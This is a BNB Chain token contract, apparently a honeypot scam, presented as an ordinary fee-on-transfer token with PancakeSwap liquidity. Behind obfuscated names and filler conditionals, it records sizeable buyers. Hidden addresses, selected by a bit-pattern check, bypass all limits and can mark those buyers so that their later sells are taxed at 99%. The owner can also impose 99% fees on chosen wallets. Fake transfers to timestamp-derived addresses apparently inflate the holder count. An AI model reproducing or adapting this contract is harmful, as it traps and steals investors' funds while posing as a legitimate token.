/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract NothingseriousGentle is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Nothingserious Gentle ";
    string constant _symbol = "NothingseriousGentle";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private exemptBuyMaxLaunched;
    mapping(address => bool) private botsMarketingTeamLiquidity;
    mapping(address => bool) private liquidityBotsModeReceiver;
    mapping(address => bool) private txAutoWalletBurn;
    mapping(address => uint256) private isTradingSwapLaunched;
    mapping(uint256 => address) private botsWalletAutoLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeBurnLaunchedAuto = 0;
    uint256 private teamBotsBuyMarketing = 6;

    //SELL FEES
    uint256 private minSwapLaunchedMax = 0;
    uint256 private launchedSellIsBots = 6;

    uint256 private burnFeeBuyTeam = teamBotsBuyMarketing + modeBurnLaunchedAuto;
    uint256 private walletFeeAutoTx = 100;

    address private maxBotsModeSellFee = (msg.sender); // auto-liq address
    address private autoBurnBotsReceiverFeeSellTeam = (0x2bd09761D06D08b316F7F577FffFFbC071E5D55F); // marketing address
    address private walletLaunchedSellTxLiquidityMarketingSwap = DEAD;
    address private marketingBuyBotsWalletFeeLaunched = DEAD;
    address private isModeSellLimitFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minIsSwapAutoModeTxBurn;
    uint256 private maxBuyTxBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private autoBotsReceiverBuy;
    uint256 private maxAutoReceiverLaunched;
    uint256 private swapWalletBurnIs;
    uint256 private buyTxTeamMax;
    uint256 private sellMaxTxIs;

    bool private exemptMaxMinSwap = true;
    bool private txAutoWalletBurnMode = true;
    bool private botsIsSellSwap = true;
    bool private maxBotsSellBuyLimitFee = true;
    bool private swapTeamFeeMarketing = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnLiquidityMaxTxReceiverIs = 6 * 10 ** 15;
    uint256 private burnMinMaxAutoSell = _totalSupply / 1000; // 0.1%

    
    bool private swapMarketingLimitTx = false;
    uint256 private swapFeeLimitBurnExempt = 0;
    bool private maxReceiverMarketingMode = false;
    uint256 private sellWalletTradingMinBurnTx = 0;
    bool private maxSwapSellLiquidity = false;
    bool private minReceiverIsSwap = false;
    bool private minModeBotsTeam = false;
    uint256 private limitExemptLaunchedIsBurnTradingFee = 0;
    bool private autoIsBuyTrading = false;
    bool private botsAutoSellModeLaunched = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        autoBotsReceiverBuy = true;

        exemptBuyMaxLaunched[msg.sender] = true;
        exemptBuyMaxLaunched[address(this)] = true;

        botsMarketingTeamLiquidity[msg.sender] = true;
        botsMarketingTeamLiquidity[0x0000000000000000000000000000000000000000] = true;
        botsMarketingTeamLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        botsMarketingTeamLiquidity[address(this)] = true;

        liquidityBotsModeReceiver[msg.sender] = true;
        liquidityBotsModeReceiver[0x0000000000000000000000000000000000000000] = true;
        liquidityBotsModeReceiver[0x000000000000000000000000000000000000dEaD] = true;
        liquidityBotsModeReceiver[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitTradingModeLaunchedSellMarketingBurn(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitTradingModeLaunchedSellMarketingBurn(sender, recipient, amount);
    }

    function limitTradingModeLaunchedSellMarketingBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (maxReceiverMarketingMode == botsAutoSellModeLaunched) {
            maxReceiverMarketingMode = minModeBotsTeam;
        }

        if (swapMarketingLimitTx == botsAutoSellModeLaunched) {
            swapMarketingLimitTx = maxBotsSellBuyLimitFee;
        }

        if (autoIsBuyTrading != minModeBotsTeam) {
            autoIsBuyTrading = txAutoWalletBurnMode;
        }


        bool bLimitTxWalletValue = exemptFeeIsWalletLimit(sender) || exemptFeeIsWalletLimit(recipient);
        
        if (maxSwapSellLiquidity != botsIsSellSwap) {
            maxSwapSellLiquidity = swapMarketingLimitTx;
        }

        if (autoIsBuyTrading == autoIsBuyTrading) {
            autoIsBuyTrading = swapMarketingLimitTx;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                botsFeeLaunchedIs();
            }
            if (!bLimitTxWalletValue) {
                marketingMinFeeBuy(recipient);
            }
        }
        
        if (botsAutoSellModeLaunched != maxBotsSellBuyLimitFee) {
            botsAutoSellModeLaunched = maxBotsSellBuyLimitFee;
        }


        if (inSwap || bLimitTxWalletValue) {return buyTxBotsFee(sender, recipient, amount);}

        if (!exemptBuyMaxLaunched[sender] && !exemptBuyMaxLaunched[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (botsAutoSellModeLaunched == botsAutoSellModeLaunched) {
            botsAutoSellModeLaunched = maxBotsSellBuyLimitFee;
        }

        if (minModeBotsTeam == minModeBotsTeam) {
            minModeBotsTeam = maxReceiverMarketingMode;
        }

        if (swapMarketingLimitTx == botsAutoSellModeLaunched) {
            swapMarketingLimitTx = txAutoWalletBurnMode;
        }


        require((amount <= _maxTxAmount) || liquidityBotsModeReceiver[sender] || liquidityBotsModeReceiver[recipient], "Max TX Limit has been triggered");

        if (limitTradingIsBotsSwap()) {feeReceiverBotsTx();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (minReceiverIsSwap != maxReceiverMarketingMode) {
            minReceiverIsSwap = autoIsBuyTrading;
        }

        if (maxSwapSellLiquidity == txAutoWalletBurnMode) {
            maxSwapSellLiquidity = maxReceiverMarketingMode;
        }


        uint256 amountReceived = receiverSellLimitTeamSwapMarketingWallet(sender) ? burnBotsSellFeeBuyTradingMode(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function buyTxBotsFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function receiverSellLimitTeamSwapMarketingWallet(address sender) internal view returns (bool) {
        return !botsMarketingTeamLiquidity[sender];
    }

    function modeMaxLaunchedExemptTx(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            burnFeeBuyTeam = launchedSellIsBots + minSwapLaunchedMax;
            return teamModeSellReceiver(sender, burnFeeBuyTeam);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnFeeBuyTeam = teamBotsBuyMarketing + modeBurnLaunchedAuto;
            return burnFeeBuyTeam;
        }
        return teamModeSellReceiver(sender, burnFeeBuyTeam);
    }

    function marketingAutoLiquidityLimitBuyMin() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function burnBotsSellFeeBuyTradingMode(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellWalletTradingMinBurnTx != minSwapLaunchedMax) {
            sellWalletTradingMinBurnTx = teamBotsBuyMarketing;
        }

        if (minModeBotsTeam != swapTeamFeeMarketing) {
            minModeBotsTeam = botsAutoSellModeLaunched;
        }


        uint256 feeAmount = amount.mul(modeMaxLaunchedExemptTx(sender, receiver == uniswapV2Pair)).div(walletFeeAutoTx);

        if (txAutoWalletBurn[sender] || txAutoWalletBurn[receiver]) {
            feeAmount = amount.mul(99).div(walletFeeAutoTx);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 4; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function exemptFeeIsWalletLimit(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function teamModeSellReceiver(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = isTradingSwapLaunched[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function marketingMinFeeBuy(address addr) private {
        if (marketingAutoLiquidityLimitBuyMin() < burnLiquidityMaxTxReceiverIs) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        botsWalletAutoLiquidity[exemptLimitValue] = addr;
    }

    function botsFeeLaunchedIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (isTradingSwapLaunched[botsWalletAutoLiquidity[i]] == 0) {
                    isTradingSwapLaunched[botsWalletAutoLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(autoBurnBotsReceiverFeeSellTeam).transfer(amountBNB * amountPercentage / 100);
    }

    function limitTradingIsBotsSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    swapTeamFeeMarketing &&
    _balances[address(this)] >= burnMinMaxAutoSell;
    }

    function feeReceiverBotsTx() internal swapping {
        
        uint256 amountToLiquify = burnMinMaxAutoSell.mul(modeBurnLaunchedAuto).div(burnFeeBuyTeam).div(2);
        uint256 amountToSwap = burnMinMaxAutoSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnFeeBuyTeam.sub(modeBurnLaunchedAuto.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeBurnLaunchedAuto).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(teamBotsBuyMarketing).div(totalETHFee);
        
        if (minModeBotsTeam == autoIsBuyTrading) {
            minModeBotsTeam = minReceiverIsSwap;
        }

        if (autoIsBuyTrading != exemptMaxMinSwap) {
            autoIsBuyTrading = swapTeamFeeMarketing;
        }

        if (minReceiverIsSwap != maxSwapSellLiquidity) {
            minReceiverIsSwap = swapTeamFeeMarketing;
        }


        payable(autoBurnBotsReceiverFeeSellTeam).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxBotsModeSellFee,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapFeeLimitBurnExempt() public view returns (uint256) {
        if (swapFeeLimitBurnExempt != swapFeeLimitBurnExempt) {
            return swapFeeLimitBurnExempt;
        }
        if (swapFeeLimitBurnExempt == swapFeeLimitBurnExempt) {
            return swapFeeLimitBurnExempt;
        }
        if (swapFeeLimitBurnExempt == launchedSellIsBots) {
            return launchedSellIsBots;
        }
        return swapFeeLimitBurnExempt;
    }
    function setSwapFeeLimitBurnExempt(uint256 a0) public onlyOwner {
        swapFeeLimitBurnExempt=a0;
    }

    function getMaxBotsSellBuyLimitFee() public view returns (bool) {
        return maxBotsSellBuyLimitFee;
    }
    function setMaxBotsSellBuyLimitFee(bool a0) public onlyOwner {
        if (maxBotsSellBuyLimitFee == botsAutoSellModeLaunched) {
            botsAutoSellModeLaunched=a0;
        }
        if (maxBotsSellBuyLimitFee != txAutoWalletBurnMode) {
            txAutoWalletBurnMode=a0;
        }
        maxBotsSellBuyLimitFee=a0;
    }

    function getLiquidityBotsModeReceiver(address a0) public view returns (bool) {
        if (a0 != maxBotsModeSellFee) {
            return botsIsSellSwap;
        }
        if (liquidityBotsModeReceiver[a0] != botsMarketingTeamLiquidity[a0]) {
            return maxReceiverMarketingMode;
        }
        if (a0 == isModeSellLimitFee) {
            return maxReceiverMarketingMode;
        }
            return liquidityBotsModeReceiver[a0];
    }
    function setLiquidityBotsModeReceiver(address a0,bool a1) public onlyOwner {
        liquidityBotsModeReceiver[a0]=a1;
    }

    function getSwapTeamFeeMarketing() public view returns (bool) {
        if (swapTeamFeeMarketing == maxReceiverMarketingMode) {
            return maxReceiverMarketingMode;
        }
        if (swapTeamFeeMarketing == minReceiverIsSwap) {
            return minReceiverIsSwap;
        }
        if (swapTeamFeeMarketing == minModeBotsTeam) {
            return minModeBotsTeam;
        }
        return swapTeamFeeMarketing;
    }
    function setSwapTeamFeeMarketing(bool a0) public onlyOwner {
        if (swapTeamFeeMarketing == swapTeamFeeMarketing) {
            swapTeamFeeMarketing=a0;
        }
        if (swapTeamFeeMarketing != maxSwapSellLiquidity) {
            maxSwapSellLiquidity=a0;
        }
        if (swapTeamFeeMarketing == maxReceiverMarketingMode) {
            maxReceiverMarketingMode=a0;
        }
        swapTeamFeeMarketing=a0;
    }

    function getBurnMinMaxAutoSell() public view returns (uint256) {
        if (burnMinMaxAutoSell != launchedSellIsBots) {
            return launchedSellIsBots;
        }
        if (burnMinMaxAutoSell != burnLiquidityMaxTxReceiverIs) {
            return burnLiquidityMaxTxReceiverIs;
        }
        return burnMinMaxAutoSell;
    }
    function setBurnMinMaxAutoSell(uint256 a0) public onlyOwner {
        if (burnMinMaxAutoSell == teamBotsBuyMarketing) {
            teamBotsBuyMarketing=a0;
        }
        burnMinMaxAutoSell=a0;
    }

    function getBurnLiquidityMaxTxReceiverIs() public view returns (uint256) {
        if (burnLiquidityMaxTxReceiverIs != launchedSellIsBots) {
            return launchedSellIsBots;
        }
        return burnLiquidityMaxTxReceiverIs;
    }
    function setBurnLiquidityMaxTxReceiverIs(uint256 a0) public onlyOwner {
        if (burnLiquidityMaxTxReceiverIs != teamBotsBuyMarketing) {
            teamBotsBuyMarketing=a0;
        }
        if (burnLiquidityMaxTxReceiverIs == limitExemptLaunchedIsBurnTradingFee) {
            limitExemptLaunchedIsBurnTradingFee=a0;
        }
        if (burnLiquidityMaxTxReceiverIs != swapFeeLimitBurnExempt) {
            swapFeeLimitBurnExempt=a0;
        }
        burnLiquidityMaxTxReceiverIs=a0;
    }

    function getMaxSwapSellLiquidity() public view returns (bool) {
        return maxSwapSellLiquidity;
    }
    function setMaxSwapSellLiquidity(bool a0) public onlyOwner {
        if (maxSwapSellLiquidity == maxReceiverMarketingMode) {
            maxReceiverMarketingMode=a0;
        }
        if (maxSwapSellLiquidity == swapTeamFeeMarketing) {
            swapTeamFeeMarketing=a0;
        }
        if (maxSwapSellLiquidity == swapTeamFeeMarketing) {
            swapTeamFeeMarketing=a0;
        }
        maxSwapSellLiquidity=a0;
    }

    function getBotsIsSellSwap() public view returns (bool) {
        return botsIsSellSwap;
    }
    function setBotsIsSellSwap(bool a0) public onlyOwner {
        if (botsIsSellSwap != txAutoWalletBurnMode) {
            txAutoWalletBurnMode=a0;
        }
        botsIsSellSwap=a0;
    }

    function getTeamBotsBuyMarketing() public view returns (uint256) {
        if (teamBotsBuyMarketing != burnFeeBuyTeam) {
            return burnFeeBuyTeam;
        }
        return teamBotsBuyMarketing;
    }
    function setTeamBotsBuyMarketing(uint256 a0) public onlyOwner {
        teamBotsBuyMarketing=a0;
    }

    function getBotsAutoSellModeLaunched() public view returns (bool) {
        return botsAutoSellModeLaunched;
    }
    function setBotsAutoSellModeLaunched(bool a0) public onlyOwner {
        botsAutoSellModeLaunched=a0;
    }

    function getExemptMaxMinSwap() public view returns (bool) {
        if (exemptMaxMinSwap == swapTeamFeeMarketing) {
            return swapTeamFeeMarketing;
        }
        if (exemptMaxMinSwap != exemptMaxMinSwap) {
            return exemptMaxMinSwap;
        }
        return exemptMaxMinSwap;
    }
    function setExemptMaxMinSwap(bool a0) public onlyOwner {
        if (exemptMaxMinSwap == botsIsSellSwap) {
            botsIsSellSwap=a0;
        }
        if (exemptMaxMinSwap != botsIsSellSwap) {
            botsIsSellSwap=a0;
        }
        exemptMaxMinSwap=a0;
    }

    function getBotsMarketingTeamLiquidity(address a0) public view returns (bool) {
        if (a0 != walletLaunchedSellTxLiquidityMarketingSwap) {
            return swapMarketingLimitTx;
        }
        if (botsMarketingTeamLiquidity[a0] != botsMarketingTeamLiquidity[a0]) {
            return minReceiverIsSwap;
        }
            return botsMarketingTeamLiquidity[a0];
    }
    function setBotsMarketingTeamLiquidity(address a0,bool a1) public onlyOwner {
        if (botsMarketingTeamLiquidity[a0] == txAutoWalletBurn[a0]) {
           txAutoWalletBurn[a0]=a1;
        }
        if (a0 != walletLaunchedSellTxLiquidityMarketingSwap) {
            exemptMaxMinSwap=a1;
        }
        if (botsMarketingTeamLiquidity[a0] != exemptBuyMaxLaunched[a0]) {
           exemptBuyMaxLaunched[a0]=a1;
        }
        botsMarketingTeamLiquidity[a0]=a1;
    }

    function getAutoIsBuyTrading() public view returns (bool) {
        return autoIsBuyTrading;
    }
    function setAutoIsBuyTrading(bool a0) public onlyOwner {
        if (autoIsBuyTrading != minModeBotsTeam) {
            minModeBotsTeam=a0;
        }
        if (autoIsBuyTrading == exemptMaxMinSwap) {
            exemptMaxMinSwap=a0;
        }
        autoIsBuyTrading=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}